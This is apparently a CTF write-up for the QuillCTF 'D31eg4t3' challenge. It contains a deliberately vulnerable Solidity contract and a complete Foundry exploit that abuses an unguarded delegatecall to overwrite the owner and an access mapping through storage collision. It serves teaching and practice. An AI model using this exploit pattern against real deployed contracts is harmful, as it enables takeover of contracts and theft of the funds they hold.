---
title: QuillCTF-5.D31eg4t3
date: 2024-01-22 17:00:44
tags:
categories: 
    - QuillCTF
---
Objective

1. Become the owner of the contract.
2. Make canYouHackMe mapping to true for your own address.

## Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract D31eg4t3{


    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    modifier onlyOwner{
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns(bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }


    function hacked() public onlyOwner{
        canYouHackMe[msg.sender] = true;
    }
}
```

## Observation

After read the whole contract , i found delegatecall function . so i thnk the key to solve the question is the `delegatecall`.

we can easy use `delegatecall` to change the variale.

## Attack

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/D31eg4t3.sol";

contract Attack{
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    function attack(address delegateAddress, address attackerAddress) public{
        D31eg4t3 delegateContract = D31eg4t3(delegateAddress);
        delegateContract.hackMe(abi.encodeWithSignature("pwn(address)", attackerAddress));
    }

    function pwn(address attackerAddress) public {
        owner = attackerAddress;
        canYouHackMe[attackerAddress] = true;
    }
}

contract testCon is Test {    
    D31eg4t3 _contract;
    address owner;
    address attacker;

    function setUp() public {
        owner = vm.addr(1);
        attacker = vm.addr(2);
        vm.startPrank(owner);
        _contract = new D31eg4t3();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Attack att = new Attack();
        att.attack(address(_contract), attacker);
        vm.stopPrank();
        assertEq(_contract.owner(), attacker);
        assert(_contract.canYouHackMe(attacker) == true);
    }
}
```